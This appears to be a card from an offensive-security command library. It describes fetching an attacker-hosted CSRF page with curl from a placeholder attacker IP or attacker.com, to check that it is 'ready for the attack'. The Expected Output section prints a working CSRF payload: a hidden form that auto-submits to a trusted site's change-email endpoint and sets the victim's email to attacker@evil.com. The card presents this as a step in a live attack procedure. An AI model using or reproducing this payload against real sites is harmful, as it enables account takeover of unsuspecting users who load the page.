---
id: cmd2-uuid
name: curl-fetch-csrf-page
type: command
executor: bash
data: 'curl "http://$_ATTACKER_IP:$_PORT/csrf.html"'
output: null
created_at: '2024-10-01T00:00:00Z'
updated_at: '2024-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - web
  - verification
  - csrf
verified: true
validated: true
---

# Curl Fetch CSRF Page

## Command

```bash
curl "http://$_ATTACKER_IP:$_PORT/csrf.html"
```

## Description

Downloads the content of the hosted CSRF HTML page to confirm it's served correctly and ready for the attack.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_ATTACKER_IP | IP address of the hosting server | Yes |
| $_PORT | Port the server is listening on | Yes |

## Examples

### Basic Usage

```bash
curl "http://192.168.1.100:8000/csrf.html"
```

### With Headers

```bash
curl -H "User-Agent: Mozilla/5.0" "http://attacker.com:80/csrf.html"
```

## Expected Output

<!DOCTYPE html>
<html>
<head><title>CSRF Payload</title></head>
<body>
<form id="csrf" action="https://trusted.domain.com/change-email" method="POST">
<input type="hidden" name="new_email" value="attacker@evil.com" />
</form>
<script>document.getElementById("csrf").submit();</script>
</body>
</html>

## Related

- [[procedures/csrf-referer-bypass-with-question-mark-injection]]
